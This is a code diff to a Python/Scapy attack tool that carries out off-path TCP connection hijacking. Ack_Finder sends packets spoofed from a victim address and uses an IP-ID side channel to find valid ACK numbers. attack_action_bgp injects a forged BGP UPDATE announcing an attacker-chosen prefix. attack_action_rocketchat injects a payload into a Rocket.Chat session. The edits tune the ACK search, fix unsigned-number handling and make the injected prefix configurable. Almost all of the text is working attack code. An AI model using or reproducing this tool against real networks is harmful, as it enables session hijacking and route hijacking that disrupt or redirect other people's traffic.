@@ -4,6 +4,7 @@ import socket
 import struct
 import threading
 import time
+import math
 from scapy.all import *
 from scapy.layers.inet import *
 from scapy.layers.l2 import *
@@ -139,11 +140,11 @@ class Ack_Finder:
 
         rb = self.seq_in_win
         lb = self.seq_in_win - (self.BLOCK * 2)
-        D = 6
+        D = 4
 
         ans = -1
         while rb >= lb:
-            mid = int((lb + rb) / 2)
+            mid = int(math.ceil((lb + rb) / 2))
             in_bound = True
             n = 0
             for i in range(0, D):
@@ -167,9 +168,13 @@ class Ack_Finder:
         C = len(list_p)
         L = 0
 
+        r_list_p = []
+        for i in range(0, len(list_p)):
+            r_list_p.append(list_p[i] if list_p[i] >= 0 else list_p[i] + (1 << 32))
+
         icmp_seq = random.randint(0, (1 << 16) - 1)
         send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
-        for ac in list_p:
+        for ac in r_list_p:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                              TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
             send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
@@ -196,6 +201,9 @@ class Ack_Finder:
         for i in range(1, C + 1):
             if ipids[i] - ipids[i - 1] >= 2:
                 list_next.append(list_p[i - 1])
+                print(i)
+                if i == 1:
+                    return None
 
         if len(list_next) == 0:
             return None
@@ -203,22 +211,23 @@ class Ack_Finder:
             return list_next[0]
 
     def __C(self, ls, lb, rb):
-        D = 2
-        
-        la = []
-        for i in range(0, len(ls)):
-            la.append(ls[i] if ls[i] >= 0 else ls[i] + (1 << 32))
+        D = 1
+        # revise
+        #for i in range(0, len(ls)):
+        #    ls[i] = ls[i] if ls[i] >= 0 else ls[i] + (1 << 32)
 
         in_bound = lb
         for i in range(0, D):
-            time.sleep(self.__sleep_time)
-            nb = self.check_new_point_ack(la)
+            time.sleep(0.6)
+            nb = self.check_new_point_ack(ls)
             if nb is None:
                 i -= 1
             else:
                 in_bound = max(in_bound, nb)
             print(in_bound)
-        return ls[la.index(in_bound)]
+
+        return in_bound
+
 
     def find_left_bound_ack(self):
         rb = self.ack_check_start
@@ -226,7 +235,7 @@ class Ack_Finder:
         L = 100
 
         while (rb - lb) >= L:
-            step = int((rb - lb) / L)
+            step = int(math.ceil(((rb - lb) / L)))
             ls = [lb]
             for i in range(0, L - 1):
                 ls.append(ls[-1] + step)
@@ -248,12 +257,13 @@ class Ack_Finder:
         for i in range(0, 3):
             check_points.append(check_points[-1] + (1 << 30))
 
-        for i in range(0, 1):
+        for i in range(0, 2):
             new_check_points = self.check_new_list(check_points)
             check_points = list(set(check_points) & set(new_check_points))
             time.sleep(self.__sleep_time)
 
         check_points.sort()
+        print(check_points)
         self.ack_check_start = check_points[0]
         print('Challenge ACK: ' + str(self.ack_check_start))
 
@@ -335,7 +345,7 @@ class Ack_Finder:
         time.sleep(self.__sleep_time)
 
 
-def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, ifname='ens33'):
+def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, inject='99.99.99.0',ifname='ens33'):
     one_payload = b''
     for i in range(0, 16):
         one_payload += struct.pack('B', (1 << 8) - 1)
@@ -367,7 +377,8 @@ def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, 
     flag3 = 0x40
     type3 = 3
     len3 = 4
-    next_hop = socket.inet_aton('10.10.100.1')
+    # next_hop = socket.inet_aton('172.21.0.70')
+    next_hop = socket.inet_aton(client_ip)
     attr3 = struct.pack('!BBB4s', flag3, type3, len3, next_hop)
 
     # attr4
@@ -379,7 +390,7 @@ def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, 
 
     # address info
     prefix_len = 24
-    network_addr = socket.inet_aton('11.11.11.0')
+    network_addr = socket.inet_aton(inject)
     b_network = struct.pack('!B3s', prefix_len, network_addr[:3])
 
     bgp_payload = one_payload + hd_bgp + attr1 + attr2 + attr3 + attr4 + b_network
@@ -419,19 +430,6 @@ def attack_action_rocketchat(client_ip, server_ip, client_port, server_port, seq
     send_list.append(IP(src=client_ip, dst=server_ip) /
                      TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack, flags='PA') /
                      load)
-    send_list.append(IP(src=client_ip, dst=server_ip) /
-                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack+5, flags='PA') /
-                     load)
-    send_list.append(IP(src=client_ip, dst=server_ip) /
-                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack-5, flags='PA') /
-                     load)
-    send_list.append(IP(src=client_ip, dst=server_ip) /
-                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack+100, flags='PA') /
-                     load)
-    send_list.append(IP(src=client_ip, dst=server_ip) /
-                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack-100, flags='PA') /
-                     load)
-
 
     send(send_list, iface=ifname, verbose=False)
 
